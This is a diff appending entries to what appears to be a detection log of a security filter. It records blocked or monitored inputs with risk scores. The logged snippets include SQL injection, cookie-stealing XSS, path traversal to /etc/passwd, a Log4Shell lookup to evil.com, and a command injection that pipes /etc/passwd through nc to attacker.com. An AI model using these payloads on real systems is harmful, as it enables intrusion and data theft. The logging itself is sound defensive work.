@@ -4838,5 +4838,165 @@
     "attack_type": "ssrf",
     "reviewed": false,
     "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:35:18Z",
+    "text_hash": "6b3b4c93704762c29b6a75fca00205c1",
+    "text_snippet": "SELECT * FROM users WHERE id=1 OR 1=1",
+    "risk_score": 0.9343455433562534,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:35:18Z",
+    "text_hash": "e5e471b69ea124fcb46a03a445960b87",
+    "text_snippet": "<script>alert(document.cookie)</script>",
+    "risk_score": 0.9437917896483199,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:35:18Z",
+    "text_hash": "1fcbd5c1448a61938f3dcc0d91e2f605",
+    "text_snippet": "../../../etc/passwd",
+    "risk_score": 0.9991187239960653,
+    "decision": "block",
+    "attack_type": "path_traversal",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:35:18Z",
+    "text_hash": "9e36512c2b002849158fb79356e0153e",
+    "text_snippet": "${jndi:ldap://evil.com/x}",
+    "risk_score": 0.9855217130126245,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:35:18Z",
+    "text_hash": "8809df8a5c63810259618ee3212c3544",
+    "text_snippet": "ls; cat /etc/passwd | nc attacker.com 4444",
+    "risk_score": 0.8659610610728847,
+    "decision": "monitor",
+    "attack_type": "command_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:44:45Z",
+    "text_hash": "6b3b4c93704762c29b6a75fca00205c1",
+    "text_snippet": "SELECT * FROM users WHERE id=1 OR 1=1",
+    "risk_score": 0.9750210051639008,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:44:45Z",
+    "text_hash": "e5e471b69ea124fcb46a03a445960b87",
+    "text_snippet": "<script>alert(document.cookie)</script>",
+    "risk_score": 0.965019240058453,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:44:45Z",
+    "text_hash": "1fcbd5c1448a61938f3dcc0d91e2f605",
+    "text_snippet": "../../../etc/passwd",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "path_traversal",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:44:45Z",
+    "text_hash": "9e36512c2b002849158fb79356e0153e",
+    "text_snippet": "${jndi:ldap://evil.com/x}",
+    "risk_score": 0.985,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:44:45Z",
+    "text_hash": "8809df8a5c63810259618ee3212c3544",
+    "text_snippet": "ls; cat /etc/passwd | nc attacker.com 4444",
+    "risk_score": 0.9396174362486994,
+    "decision": "block",
+    "attack_type": "command_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:51:07Z",
+    "text_hash": "6b3b4c93704762c29b6a75fca00205c1",
+    "text_snippet": "SELECT * FROM users WHERE id=1 OR 1=1",
+    "risk_score": 0.9750210051639008,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:51:07Z",
+    "text_hash": "e5e471b69ea124fcb46a03a445960b87",
+    "text_snippet": "<script>alert(document.cookie)</script>",
+    "risk_score": 0.965019240058453,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:51:07Z",
+    "text_hash": "1fcbd5c1448a61938f3dcc0d91e2f605",
+    "text_snippet": "../../../etc/passwd",
+    "risk_score": 1.0,
+    "decision": "block",
+    "attack_type": "path_traversal",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:51:07Z",
+    "text_hash": "9e36512c2b002849158fb79356e0153e",
+    "text_snippet": "${jndi:ldap://evil.com/x}",
+    "risk_score": 0.985,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-15T22:51:07Z",
+    "text_hash": "8809df8a5c63810259618ee3212c3544",
+    "text_snippet": "ls; cat /etc/passwd | nc attacker.com 4444",
+    "risk_score": 0.9396174362486994,
+    "decision": "block",
+    "attack_type": "command_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-05-21T11:01:18Z",
+    "text_hash": "3165078f1b9b74a14060f961d0a4478d",
+    "text_snippet": "http://127.0.0.1/admin",
+    "risk_score": 0.9992584692735107,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
   }
 ]
